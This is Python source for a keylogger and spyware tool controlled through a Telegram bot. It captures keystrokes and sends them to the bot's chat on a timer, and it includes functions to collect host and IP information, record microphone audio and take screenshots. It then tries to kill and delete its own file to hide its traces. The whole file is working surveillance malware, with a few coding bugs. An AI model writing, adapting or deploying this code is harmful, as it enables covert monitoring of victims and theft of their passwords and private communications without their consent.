import logging
import os
import platform
import threading
import wave
import socket
import pyscreenshot
import sounddevice as sd
import cv2
import telebot

from pynput import keyboard
from pynput.keyboard import Listener

bot = telebot.TeleBot("Your Token", parse_mode=None)

@bot.message_handler(commands=['start', 'help', 'check'])
def send_welcome(message):
	bot.reply_to(message, "Bot started / Bot Is Running")

@bot.message_handler(commands=['send', 'fetch'])
def send_data(message):
    class KeyLogger:
        def __init__(self, time_interval):
            self.log = "KeyLogger Started..."
            self.interval = time_interval

        def appendlog(self, string):
            self.log = self.log + string
        
        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)
        
        def send_message(self, thing):
            bot.reply_to(message, thing)

        def report(self):
            self.send_message(self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = 10
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_message(thing=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_message(thing=img)

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is closed.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is closed.')

    keylogger = KeyLogger(10)
    keylogger.run()

@bot.message_handler(func=lambda message: True)
def echo_all(message):
	bot.reply_to(message, "Wrong Command")

bot.polling()
